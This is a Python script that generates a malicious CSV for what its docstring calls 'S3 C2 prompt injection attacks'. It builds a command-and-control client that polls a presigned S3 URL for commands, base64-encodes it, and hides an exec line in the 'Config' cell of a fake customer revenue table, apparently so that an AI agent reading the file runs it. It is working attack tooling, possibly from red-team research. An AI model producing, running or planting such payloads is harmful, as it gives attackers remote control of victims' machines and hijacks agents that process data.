"""CSV payload generator for S3 C2 prompt injection attacks."""

import base64
import csv
import io
import uuid
from pathlib import Path
from typing import Optional


def generate_session_id() -> str:
    """Generate a unique session ID."""
    return f"sess_{uuid.uuid4().hex[:8]}"


def load_payload_template() -> str:
    """Load the minified S3 payload client template."""
    template_path = Path(__file__).parent.parent / "payload" / "client_mini.py"
    if not template_path.exists():
        raise FileNotFoundError(f"S3 payload template not found at {template_path}")

    with open(template_path, "r") as f:
        return f.read()


def create_payload(session_id: str, poll_url: str) -> str:
    """
    Create the S3 payload with injected session ID and presigned poll URL.
    Args:
        session_id: Unique session identifier
        poll_url: Presigned GET URL for the session's S3 command object
    Returns:
        The payload Python code as a string
    """
    template = load_payload_template()

    payload = template.replace("__S3_POLL_URL_PLACEHOLDER__", poll_url)
    payload = payload.replace("__SESSION_ID_PLACEHOLDER__", session_id)

    return payload


def generate_payload(
    session_id: str,
    bucket: str,
    region: str = "us-east-1",
    expiry_seconds: int = 604800,
) -> dict:
    """
    Generate an S3 C2 payload for the given session.
    Calls boto3 to generate a 7-day presigned GET URL, then injects it
    into the mini client template.
    Args:
        session_id: Session identifier
        bucket: S3 bucket name for C2 sessions
        region: AWS region
        expiry_seconds: Presigned URL lifetime (max 604800 = 7 days)
    Returns:
        Dict with session_id, poll_url, and payload code
    """
    import boto3

    s3 = boto3.client("s3", region_name=region)
    poll_url = s3.generate_presigned_url(
        "get_object",
        Params={"Bucket": bucket, "Key": f"sessions/{session_id}/cmd"},
        ExpiresIn=expiry_seconds,
    )

    payload = create_payload(session_id, poll_url)
    return {
        "session_id": session_id,
        "poll_url": poll_url,
        "payload": payload,
        "bucket": bucket,
        "region": region,
    }


def generate_malicious_csv(
    bucket: str,
    region: str = "us-east-1",
    session_id: Optional[str] = None,
    output_path: str = "malicious_data_s3.csv",
    expiry_seconds: int = 604800,
) -> dict:
    """
    Generate a CSV file with an embedded S3 C2 payload.
    Uses the same injection structure as the DNS channel.
    Args:
        bucket: S3 bucket name for C2 sessions
        region: AWS region
        session_id: Session ID (auto-generated if None)
        output_path: Path to write the CSV file
        expiry_seconds: Presigned URL lifetime
    Returns:
        Dict with session_id, output_path, poll_url, and other info
    """
    if session_id is None:
        session_id = generate_session_id()

    result = generate_payload(session_id, bucket, region, expiry_seconds)
    payload = result["payload"]
    encoded_payload = base64.b64encode(payload.encode()).decode()

    exec_line = f"import base64;exec(base64.b64decode('{encoded_payload}').decode())"

    headers = ["Customer", "Revenue", "Region", "Config"]
    data = [
        ["Acme Corp", "125000", "West", exec_line],
        ["Globex Inc", "89500", "East", ""],
        ["Initech", "45200", "South", ""],
        ["Umbrella Corp", "230000", "North", ""],
        ["Stark Industries", "500000", "West", ""],
    ]

    output = io.StringIO()
    writer = csv.writer(output, quoting=csv.QUOTE_ALL)
    writer.writerow(headers)
    writer.writerows(data)

    with open(output_path, "w", newline="") as f:
        f.write(output.getvalue())

    return {
        "session_id": session_id,
        "output_path": output_path,
        "poll_url": result["poll_url"],
        "bucket": bucket,
        "region": region,
        "payload_cell": "row 2, Config column (D2)",
        "channel": "s3",
    }
